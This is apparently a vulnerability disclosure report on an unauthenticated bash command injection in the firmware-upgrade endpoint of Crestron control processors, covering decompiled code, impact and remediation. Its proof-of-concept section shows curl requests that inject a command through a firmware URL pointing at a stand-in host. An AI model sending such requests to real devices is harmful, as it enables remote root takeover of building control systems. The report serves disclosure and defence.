# [REDACTED-ID]_006: CWS upgradeFirmware Unauthenticated Bash Command Injection

| Field | Value |
|-------|-------|
| **Finding ID** | [REDACTED-ID]_006 |
| **Title** | Unauthenticated Bash Command Injection via CWS upgradeFirmware |
| **Severity** | CRITICAL (CVSS 3.1: 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Type** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **Affected Products** | 4-Series Control Processors (CP4, CP4-R, CP4N), MC4 Master Controllers, DIN-AP Automation Processors, PYNG-HUB, and all Crestron control systems where /cws is excluded from authentication |
| **Firmware Analyzed** | TSW-XX60 v3.002.1061 (PUF extracted, Ghidra RE of libRXModeHandler.so) |
| **Discovery Method** | Ghidra decompilation of `libRXModeHandler.so` → `TSXsystemInfoServiceImpl::upgradeFirmware()` |
| **Date Discovered** | 2026-03-03 |
| **Researchers** | [REDACTED] Team |

---

## 1. Executive Summary

The Crestron Web Scripting (CWS) API endpoint `/cws/systeminfo/upgradefirmware` is designed to initiate firmware upgrades by accepting a firmware URL/path. The `upgradeFirmware()` function in `libRXModeHandler.so` formats the user-supplied URL into a command buffer using `__sprintf_chk()`, then passes it directly to `consoleInterface::runCommandAtBashPrompt()` — a function that executes its argument in a **full bash shell**, not through CTP.

This is distinct from [REDACTED-ID]_005 (`uploadProject`) in a critical way: `uploadProject` uses `system()` (which invokes `/bin/sh`), while `upgradeFirmware` uses `runCommandAtBashPrompt()` which provides **direct bash execution** — a richer shell environment with more exploitation possibilities (bash-specific features like process substitution, brace expansion, etc.).

Combined with [REDACTED-ID]_004 (CWS authentication bypass), this is another **single-request, unauthenticated, remote root code execution** vector.

---

## 2. Technical Root Cause

### 2.1 The Vulnerable Code Path

**Binary:** `libRXModeHandler.so` (ARM32 shared library, 556KB)
**Class:** `TSXsystemInfoServiceImpl`
**Function:** `upgradeFirmware(char *param_1, char *param_2, char *param_3)`

```c
// TSXsystemInfoServiceImpl::upgradeFirmware() — Ghidra decompilation
void upgradeFirmware(char *param_1, char *param_2, char *param_3) {
    char acStack_490[100];
    char acStack_42c[...];
    int local_494;

    // Step 1: Format command with user-supplied firmware URL
    __sprintf_chk(acStack_490, 0, 100, format_string, param_3);
    //             ↑ buffer     ↑ flag  ↑ max  ↑ fmt     ↑ USER INPUT (firmware URL)

    // Step 2: Execute at bash prompt — NOT through CTP, DIRECT BASH
    consoleInterface::runCommandAtBashPrompt(acStack_490, acStack_42c, &local_494);
    //                                       ↑ VULNERABLE: user input in bash command
}
```

### 2.2 `runCommandAtBashPrompt()` vs `runCommand()`

| Function | Shell | Used By |
|----------|-------|---------|
| `runCommand()` | CTP console interpreter | Most CWS operations (reboot, restore, reset password) |
| `runCommandAtBashPrompt()` | **Full bash shell** | `upgradeFirmware()` — direct OS-level execution |

`runCommandAtBashPrompt()` bypasses the CTP console entirely and executes directly in bash. This means:
- No CTP `validateCharacters()` filtering (the 7-char blocklist)
- No CTP command parsing overhead
- Full bash shell features available (heredocs, process substitution, etc.)

### 2.3 No Input Validation

The firmware URL/path parameter passes through **zero validation** between the HTTP request body and the `__sprintf_chk()` → `runCommandAtBashPrompt()` chain:

| Layer | Component | Blocks Injection? |
|-------|-----------|-------------------|
| 1. HTTP | lighttpd `/cws` | **NO** — excluded from auth ([REDACTED-ID]_004) |
| 2. CWS Dispatch | `processRequestMethod()` | **NO** — zero auth or input checks |
| 3. Handler | `upgradeFirmware()` | **NO** — direct sprintf + bash exec |

---

## 3. Proof of Concept

### 3.1 Unauthenticated Access to upgradeFirmware

```bash
# Step 1: Confirm /cws is unauthenticated
$ curl -sk https://<TARGET>/cws/
{
  "Authentication": "NOT REQUIRED",
  "Modules": ["systeminfo","auth","ethernet","join","txrx","8021x","cloud"]
}

# Step 2: Trigger upgradeFirmware with injected command
$ curl -sk -X POST https://<TARGET>/cws/systeminfo/upgradefirmware \
    -H 'Content-Type: application/json' \
    -d '{"url":"http://evil.com/fw.puf;id;#"}'
```

### 3.2 Injection Mechanics

| Component | Value |
|-----------|-------|
| User input (URL) | `http://evil.com/fw.puf;id;#` |
| `__sprintf_chk()` result | `<upgrade_cmd> http://evil.com/fw.puf;id;# ...` |
| `runCommandAtBashPrompt()` | bash interprets: `<upgrade_cmd>(fails)` **;** `id`(executes) **;** `#`(comments rest) |

### 3.3 Comparison with [REDACTED-ID]_005

| Property | [REDACTED-ID]_005 (uploadProject) | [REDACTED-ID]_006 (upgradeFirmware) |
|----------|-------------------------|--------------------------|
| **Injection target** | Filename parameter | Firmware URL parameter |
| **Execution method** | `system()` → `/bin/sh` | `runCommandAtBashPrompt()` → `/bin/bash` |
| **Escaping applied** | Spaces only | **None** |
| **Shell features** | sh (POSIX) | **bash** (full features) |
| **Auth required** | No ([REDACTED-ID]_004) | No ([REDACTED-ID]_004) |
| **Buffer size** | ~1024 bytes (acStack_62c) | 100 bytes (acStack_490) |

[REDACTED-ID]_006 has a **smaller buffer** (100 bytes) which constrains payload size, but applies **zero escaping** (not even spaces), making injection simpler than [REDACTED-ID]_005.

---

## 4. Impact

| Scenario | Severity |
|----------|----------|
| Single-request unauthenticated RCE via bash | **CRITICAL** |
| No escaping at all — simpler than [REDACTED-ID]_005 | **CRITICAL** |
| Firmware replacement with malicious image | CRITICAL |
| Persistent backdoor installation | CRITICAL |
| Device takeover, lateral movement | HIGH |

### Affected Device Population

Same as [REDACTED-ID]_005: all Crestron control system devices where `/cws` is excluded from authentication (~4,800+ internet-facing on Shodan).

---

## 5. Firmware Evidence

| File | Location | Relevance |
|------|----------|-----------|
| `libRXModeHandler.so` | `/system/lib/` | Contains `upgradeFirmware()` with `__sprintf_chk()` → `runCommandAtBashPrompt()` |
| `authlocations_authon_prog0.conf` | `/data/lighttpd/conf.d/` | `/cws` excluded from auth |
| `configure_webserver.sh` | `/system/bin/` | Dynamically injects `/cws` into auth exclusion |

---

## 6. Suggested Remediation

1. **Authenticate /cws**: Apply authentication to `/cws` endpoints (same as [REDACTED-ID]_004, [REDACTED-ID]_005)
2. **URL validation**: Strict allowlist for firmware URL — enforce `https://` scheme, validate domain against known Crestron update servers, reject all shell metacharacters
3. **Avoid `runCommandAtBashPrompt()`**: Use `execve()` with argument arrays — never interpolate user input into shell command strings
4. **Buffer overflow protection**: The 100-byte `__sprintf_chk()` buffer is small; while `__sprintf_chk` provides compile-time bounds checking, ensure runtime bounds are enforced

---

## 7. Limitations

- **Static analysis only for this specific function**: The exact format string for `upgradeFirmware()` was not fully recovered from the decompilation. The vulnerability pattern (`sprintf` → `runCommandAtBashPrompt()` with unsanitized user input) is confirmed.
- **Buffer size constraint**: The 100-byte `acStack_490` limits payload length. Complex commands may need to be shortened or staged.
- **[REDACTED-ID]_004 dependency**: Requires `/cws` to be excluded from authentication for unauthenticated exploitation.
